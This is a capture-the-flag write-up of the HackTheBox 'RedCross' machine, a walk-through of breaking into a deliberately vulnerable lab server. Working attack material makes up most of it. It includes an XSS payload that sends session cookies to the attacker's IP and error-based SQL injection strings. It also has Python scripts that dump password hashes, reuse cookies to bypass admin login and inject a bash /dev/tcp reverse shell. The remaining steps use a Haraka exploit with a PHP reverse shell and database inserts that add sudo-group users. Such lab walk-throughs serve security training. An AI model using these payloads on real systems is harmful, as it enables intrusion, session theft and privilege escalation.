---
title: "HackTheBox - RedCross"
categories: [HackTheBox, Medium]
tags: [Linux,Medium,Web,OSWE,XSS,SQLInjection,PSQL]
mermaid: true
image: https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2007:22:53.png
---

RedCross was a crazy box. Really interesting and I learned a lot from it. It's a Medium Level Box from HackTheBox. It's OS is Linux. I started just enumerating the website, and found good things.

We did a SQLInjection to get some users hashes, to login on the admin interface, we can do that by cookies also. After that we got multiple ways to get reverse shell.

The privilege escalation I did trough SQL queries, but can also be done with BOF in iptctl, which one I'll do later.

Hope you enjoy it.

# Diagram

Here is the diagram for this machine. It's a resume from it.

```mermaid
graph TD
    A[Enumeration] -->|Nmap - Gobuster - Wfuzz| B(intra.redcross)
    B --> |Path 1 - XSS| C[Logged in intra.redcross]
    B --> |Path 2 - Create a Login as Guest| C[Logged in intra.redcross]
    C --> |Path 1 - SQLinjection - Charlie| D(Logged in admin.redcross)
    C --> |Path 2 - Guest cookie| D
    D --> |Firewall Rule| E[www-data shell]
    D --> |Haraka exploit| F[penelope shell]
    F --> |Find PSQL Creds| H[root shell]
    E --> |Find PSQL Creds| H[root shell]
```

# Enumeration

First step is to enumerate the box. For this we'll use `nmap`

```sh
nmap -sV -sC -Pn 10.10.10.113
```

> -sV - Services running on the ports

> -sC - Run some standart scripts

> -Pn - Consider the host alive

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:23:44.png)

## Port 80

Once we found just the port 80 opened, so let's focus on this one to enumerate it.

We open it on the browser and see what is being shown.

When tryied to access 10.10.10.113 on the browser, it is redirect to

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:24:07.png)

So we add it on the /etc/hosts and try again

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:24:47.png)

Looking at the source code we find a possible user, **penelope**

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:25:23.png)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:25:44.png)

We see that it seems to be a php website, looking at how the url is structured.

Once we found a `intra` subdomain, is very useful if we try to bruteforce it to see if there are other subdomains in it

```sh
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u https://10.10.10.113 -H "Host: FUZZ.redcross.htb" --hw 28 --hc 400
```

We found `admin` and `intra`

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2009:27:39.png)

Great.

We start a `gobuster` in it to enumerate the `intra` subdomain

```sh
gobuster dir -k -u https://intra.redcross.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,pdf -t 20
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:32:53.png)

We perform another gobuster on the `documentation` folder

```sh
gobuster dir -k -u https://intra.redcross.htb/documentation -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,pdf -t 20
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:33:43.png)

And we found an account-signup file in it. Which is very interesting.

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2005:07:45.png)

Here we have two paths to get access to the box, I'll explain both, and try to automate both of them

## Path 1 - XSS

In the contact form, at **https://intra.redcross.htb/?page=contact**, if you try to enter script tags into the subject or the body, it spawns an error

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2005:09:40.png)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2005:09:25.png)

The same thing does not happen if we try to poison the `contact` tag

```js
<script src="http://10.10.14.20:9090/cookie.js"></script>
```

And the payload

```js
function addTheImage() {
        var img = document.createElement('img');
        img.src = 'http://10.10.14.20:9090/' + document.cookie;
document.body.appendChild(img);
}

addTheImage();
```

Now we trigger it

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2005:15:01.png)

And then, we get cookies!

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2005:15:29.png)

`PHPSESSID=2kd6l8mmkv3n4rfsh2slcma8u6`

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2005:17:12.png)

Now we just set it on the browser and get access to the `admin` panel

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2005:18:35.png)

## Path 2 - Create a Login

First we need to create e valid login on the application

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2005:25:35.png)

We get `guest:guest`

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2005:25:52.png)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2005:26:14.png)

Get logged in as Guest

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2005:26:38.png)

### SQLInjection

Now, if we try to put a `'` on the UserID, we will se that it will trigger a SQL Error. Seems that we have a SQLInjection on this box

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2005:27:57.png)

Now, let's explore it

First, we must find a way to determine how the query is being mounted, based on the error message

We got a good post from [Netspi](https://sqlwiki.netspi.com/injectionTypes/errorBased/#mysql) which will help us

We get a query test on this website for getting the version and testing it

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2005:52:57.png)

```
SELECT 1 AND(SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT username FROM USERS LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2005:53:11.png)

And we get the version of the database, which is great.

Now we can start the extraction of data from it

```
1') AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT username FROM users LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)-- -
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2005:59:00.png)

Let's mount a script in python to automate it and retrieve all the info I need

So, we'll start with our python skeleton

```py
#!/usr/bin/python3

import argparse
import requests
import sys

'''Here come the Functions'''

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-u', '--username', help='Username to target', required=False)
    parser.add_argument('-w', '--wordlist', help='Wordlist to be used', required=False)
    args = parser.parse_args()
    
    '''Here we call the functions'''
    
if __name__ == '__main__':
    main()
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:59:10.png)

sqli_redcross.py

```py
#!/usr/bin/python3
# Date: 2021-10-09
# Exploit Author: 0x4rt3mis
# Hack The Box - RedCross
# SQLInjection to Retrieve User Hashes

import argparse
import requests
import sys
import urllib3
import urllib

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()
urllib3.disable_warnings()

'''Here come the Functions'''

# First, we need to create a user on the app, to get logged in and access the SQLInjection
def login(rhost):
    # Get the cookies
    url = "https://intra.%s.htb:443/?page=contact" %rhost
    headers = {"Referer": "https://intra.redcross.htb/?page=login"}
    r.get(url, headers=headers, cookies=r.cookies, proxies=proxies, verify=False)
    # Now create a login fake
    url = "https://intra.%s.htb:443/pages/actions.php" %rhost
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"subject": "credentials", "body": "username=0x4rt3mis", "cback": "0x4rt3mis@email.com", "action": "contact"}
    r.post(url, headers=headers, data=data, proxies=proxies, cookies=r.cookies, allow_redirects=True, verify=False)
    # Now, indeed login
    url = "https://intra.%s.htb:443/pages/actions.php" %rhost
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"user": "guest", "pass": "guest", "action": "login"}
    r.post(url, headers=headers, data=data, proxies=proxies, cookies=r.cookies, allow_redirects=True, verify=False)

# Now let's exfiltrate it
def dataExfilDump(rhost):
    limit = 0
    columns = ['username','password']
    tables = ['users']
    while limit < 30:
        for table in tables:
            for column in columns:
                print("----")
                payload = urllib.parse.quote_plus("1') AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT %s FROM %s LIMIT %s,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)-- -" %(column,table,limit))
                url = "https://intra.%s.htb:443/?o="%rhost + payload + "&page=app&page=app"
                exfil = r.get(url, cookies=r.cookies, proxies=proxies, verify=False, allow_redirects=True)
                if "Duplicate" in exfil.text:
                    index = exfil.text.find("DEBUG INFO")
                    data = exfil.text[index:index+128].split('\'')[1][:-1][1:]
                    print("[+] %s [+]!"%column)
                    print(data)
                    column = column[+1]
                else:
                    print("[+] Gooooot it !!! [+]")
                    return
            limit = limit +1

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-d', '--dump',choices=('True','False'), help='Chosse between True and False for DUMP auto - DEFAULT FALSE')
    args = parser.parse_args()

    global flag
    flag = args.dump == 'True'
    rhost = args.target

    '''Here we call the functions'''
    # Make the login request to get cookies
    login(rhost)
    # Test if flag is seted and starting the sqlinjection to retrieve data
    if flag:
        dataExfilDump(rhost)
        
if __name__ == '__main__':
    main()
```

Now we bruteforce the `charles` password and found it

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2007:49:29.png)

The password is **cookiemonster**

### Charles Admin?!

Now we log in the app

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:00:09.png)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:00:53.png)

If we try to access the `admin` page, we got an error

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:01:03.png)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:01:18.png)

And be redirect to the login page.

However, if we take the cookie of guest or charles intra and set it as the PHPSESSID for admin, it works. We'll go to the intra site logged in as charles and get it

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:02:39.png)

Now we set it

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:03:04.png)

And, when we reload the page, we got access

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:03:22.png)

The same technique works with the guest cookie, meaning I could have skipped the SQLi all together.

So, we will do a python script to get there, just getting the guest/guest and seeting it as cookie to access the admin page

```py
#!/usr/bin/python3
# Date: 2021-10-09
# Exploit Author: 0x4rt3mis
# Hack The Box - RedCross
# Get access to admin page using guest cookies

import argparse
import requests
import sys
import urllib3
import urllib

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()
urllib3.disable_warnings()

'''Here come the Functions'''

# First, we need to create a user on the app, to get logged in and access the SQLInjection
def login(rhost):
    # Get the cookies
    url = "https://intra.%s.htb:443/?page=contact" %rhost
    headers = {"Referer": "https://intra.redcross.htb/?page=login"}
    r.get(url, headers=headers, cookies=r.cookies, proxies=proxies, verify=False)
    # Now create a login fake
    url = "https://intra.%s.htb:443/pages/actions.php" %rhost
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"subject": "credentials", "body": "username=0x4rt3mis", "cback": "0x4rt3mis@email.com", "action": "contact"}
    r.post(url, headers=headers, data=data, proxies=proxies, cookies=r.cookies, allow_redirects=True, verify=False)
    # Now, indeed login
    url = "https://intra.%s.htb:443/pages/actions.php" %rhost
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"user": "guest", "pass": "guest", "action": "login"}
    r.post(url, headers=headers, data=data, proxies=proxies, cookies=r.cookies, allow_redirects=True, verify=False)
    global cookie
    cookie = r.cookies['PHPSESSID']

def adminPageCookie(rhost):
    # Ok, let's clean the cokies
    # First we just log in as guest
    url = "https://admin.%s.htb:443/pages/actions.php" %rhost
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"user": "guest", "pass": "guest", "action": "login"}
    r.post(url, headers=headers, cookies=r.cookies, data=data, verify=False, proxies=proxies, allow_redirects=True)
    # Clean the cookies
    r.cookies.clear()
    # Now, set the cookie from the guest, to get the access!
    r.cookies.set('PHPSESSID', cookie, path='/', domain='admin.redcross.htb')
    # Now get on the page
    url = "https://admin.%s.htb/?page=cpanel" %rhost
    r.get(url, proxies=proxies, verify=False, allow_redirects=True)

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    args = parser.parse_args()
    rhost = args.target

    '''Here we call the functions'''
    # Make the login request to get cookies
    login(rhost)
    adminPageCookie(rhost)


if __name__ == '__main__':
    main()
```

Great, now we have the proper access to the admin page with the guest cookies seted

# Penelope Shell

Now, we already have access to the admin page, we can start to get a reverse shell on this box

## Open Firewall

First thing to do is enable the firewall rule on the website

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:29:43.png)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:29:30.png)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:29:56.png)

Now, we see new ports opened on the box

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:30:26.png)

## Path 1: Haraka

We see the port 1025, we try to nc it

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:34:35.png)

We look for exploits

```sh
searchsploit haraka
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:32:34.png)

The only change we did on the exploit was on line 123, it was trying to connect on port 25, the correct is 1025 in this case.

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:37:09.png)

Now, we execute and get a shell

```sh
python 41162.py -c "php -r '\$sock=fsockopen(\"10.10.14.20\",443);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" -t penelope@redcross.htb -m 10.10.10.113
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:37:41.png)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:38:44.png)

## Path 2: www-data

We can access the other panel of the admin page and see what we have there

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:40:44.png)

We add a new user

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:40:55.png)

We got credentials

**0x4rt3mis : xL0ohUnj**

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:41:04.png)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:41:20.png)

We try ssh on the box

Got it

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:41:49.png)

We are in a jail

For now, the only interesting thing I can find is in /home/public/src/iptctl.c

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:42:51.png)

We can see the string "DEBUG: All checks passed… Executing iptables" and "Network access granted to %s\n". it looks like this program is being called when I submit anything to the page, obsvisously I'll not have access to the php source code to analyze it. But we can send it to burp and see how it's being used.

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:46:52.png)

And on the Deny

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:49:00.png)

```
ip=10.10.14.20&id=13&action=deny
```

We suppos that the page is executing a command in the ip parameter, a bash one, so, if we put a semicolon on the end we can execute other commands

Yep, we got it

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:49:25.png)

Now let's test to our box with a reverse shell

```
ip=10.10.14.20%3bbash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.20/443+0>%261'&id=13&action=deny
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:52:54.png)

Now, let's update our script to auto get this shell!!!

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2009:05:17.png)

rev_www-data.py

```py
#!/usr/bin/python3
# Date: 2021-10-09
# Exploit Author: 0x4rt3mis
# Hack The Box - RedCross
# Get auto reverse shell

import argparse
import requests
import sys
import urllib3
import urllib
import socket, telnetlib
from threading import Thread

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()
urllib3.disable_warnings()

'''Here come the Functions'''

# Set the handler
def handler(lport,target):
    print("[+] Starting handler on %s [+]" %lport) 
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',lport))
    s.listen(1)
    conn, addr = s.accept()
    print("[+] Connection from %s [+]" %target) 
    t.sock = conn
    print("[+] Shell'd [+]")
    t.interact()

# First, we need to create a user on the app, to get logged in and access the SQLInjection
def login(rhost):
    # Get the cookies
    url = "https://intra.%s.htb:443/?page=contact" %rhost
    headers = {"Referer": "https://intra.redcross.htb/?page=login"}
    r.get(url, headers=headers, cookies=r.cookies, proxies=proxies, verify=False)
    # Now create a login fake
    url = "https://intra.%s.htb:443/pages/actions.php" %rhost
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"subject": "credentials", "body": "username=0x4rt3mis", "cback": "0x4rt3mis@email.com", "action": "contact"}
    r.post(url, headers=headers, data=data, proxies=proxies, cookies=r.cookies, allow_redirects=True, verify=False)
    # Now, indeed login
    url = "https://intra.%s.htb:443/pages/actions.php" %rhost
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"user": "guest", "pass": "guest", "action": "login"}
    r.post(url, headers=headers, data=data, proxies=proxies, cookies=r.cookies, allow_redirects=True, verify=False)
    global cookie
    cookie = r.cookies['PHPSESSID']
    print("[+] Login as guest successssss!!!!! [+]")
    print("[+] PHPSSESID Got !!!!!! [+]")

def adminPageCookie(rhost):
    # Ok, let's clean the cokies
    # First we just log in as guest
    url = "https://admin.%s.htb:443/pages/actions.php" %rhost
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"user": "guest", "pass": "guest", "action": "login"}
    r.post(url, headers=headers, cookies=r.cookies, data=data, verify=False, proxies=proxies, allow_redirects=True)
    # Clean the cookies
    r.cookies.clear()
    # Now, set the cookie from the guest, to get the access!
    r.cookies.set('PHPSESSID', cookie, path='/', domain='admin.redcross.htb')
    # Now get on the page
    url = "https://admin.%s.htb/?page=cpanel" %rhost
    r.get(url, proxies=proxies, verify=False, allow_redirects=True)
    print("[+] Admin loged in with poison coooooookies !!!! [+]")
    
def getReverseShell(rhost, lhost, lport):
    print("[+] Now, let's get a reverse www-data shell !!!!!!! [+]")
    payload = ";bash -c 'bash -i >& /dev/tcp/'" + lhost + "'/'" + lport + "' 0>&1'"
    url = "https://admin.%s.htb:443/pages/actions.php" %rhost
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"ip": "%s" %payload, "action": "deny"}
    print("[+] Sheeeell Got !!!!! [+]")
    r.post(url, headers=headers, cookies=r.cookies, data=data, proxies=proxies, verify=False)

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-li', '--localhost', help='Local ip to receive the reverse shell', required=True)
    parser.add_argument('-lp', '--localport', help='Local port to receive the reverse shell', required=True)
    args = parser.parse_args()
    
    rhost = args.target
    lhost = args.localhost
    lport = args.localport
    
    '''Here we call the functions'''
    # Start the handler
    thr = Thread(target=handler,args=(int(lport),rhost))
    thr.start()
    # Make the login request to get cookies
    login(rhost)
    # Become admin
    adminPageCookie(rhost)
    # Get www-data reverse shell
    getReverseShell(rhost, lhost, lport)

if __name__ == '__main__':
    main()
```

## Penelope Shell

We can get a penelope shell too on this box

First we need to find postgresql Creds

With few greps looking for password we found something interesting in `actions.php`

```sh
cat ./actions.php -n | grep password --color
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:43:57.png)

We found a particular good function in it

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:45:10.png)

It seems to have the power to add users on the system... Which is very interesting!

We connect on the `psql`

```sh
psql -h 127.0.0.1 -U unixusrmgr -p 5432 -d unix
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:47:25.png)

We found the structure of the passwd_table

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:48:40.png)

So, we can add a user with the same id as penelope, and get it

We generate our password

```sh
openssl passwd -1 0x4rt3mis
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:50:53.png)

`insert into passwd_table (username, passwd, gid, homedir) values ('pene0x4rt3mis', '$1$HW2gdUaa$x1.3nBELapjD3I4EMAvbU/', 1000, '/home/penelope');`

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:52:05.png)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:52:23.png)

Now, we ssh in it

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:53:49.png)

Got.

# Root Shell

Now, we can set it also to root user

## Sudo Group

We will create another user, this time with the sudoers group, which is 27:

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:54:42.png)

`insert into passwd_table (username, passwd, gid, homedir) values ('root0x4rt3mis', '$1$HW2gdUaa$x1.3nBELapjD3I4EMAvbU/', 27, '/home/penelope');`

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:55:47.png)

Now, ssh in it

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2008:56:19.png)

We can also add an user with the root id, we have a lot of options here. I'll now show all of them.

## BOF in iptctl

We have another way to get it by BOF in iptctl.

We can explore it also. I'll not show it here now for a matter of time. I'll come back here in the future and update it.

# Source Code Analysis

We can also do some kind of static code analysis in this box.

## SQLInjection Detail

We could look for this SQLInjection on this box

We could start looking for every place where we have GET, POST or REQUEST.

```sh
grep -n -R -i '$_[GPR].*\[' .
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2009:20:20.png)

We find few options.

Let's resume it more

```sh
grep -l -e "GET['o']" $(grep -l -e SELECT `grep -rl -e '$_[GPR].*\[' .`)
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2009:30:47.png)

We got just one!

If we look on how the query to trigger the SQLInjection is built, we see a "o" parameter in the GET request

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2009:18:47.png)

Sure, now we already know what to look for on the code, where this "o" variable are being mounted

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2009:19:16.png)

We know that it's being triggered on this app.php file

We see on line 19 it looks to see if the AUTH is seted, if it's seted it continues to line 25, where see if the parameter O is seted, if is seted it is passed to the SELECT query. So, it's not being sanitized anywhere, what we put on the O variable, is going to be triggered on the mysql!

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2009:34:16.png)

Great, we already know where is the injection point. And we can start playing with it.

We got a very good blog from [NetSpi](https://sqlwiki.netspi.com/injectionTypes/errorBased/#mysql) which explains how it works. And we see the payload to test the Error Based SQLInjection in MYSQL.

```
SELECT extractvalue(rand(),concat(0x3a,(select version())))
```

So we mount the query and after some tests, we got it

```
1')+AND+(SELECT+extractvalue(rand(),concat(0x3a,(select+version()))))--+-
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-09-HackTheBox-RedCross/2021-09-09-HackTheBox-RedCross%2007:39:16.png)

After that I started to build my script to automate it.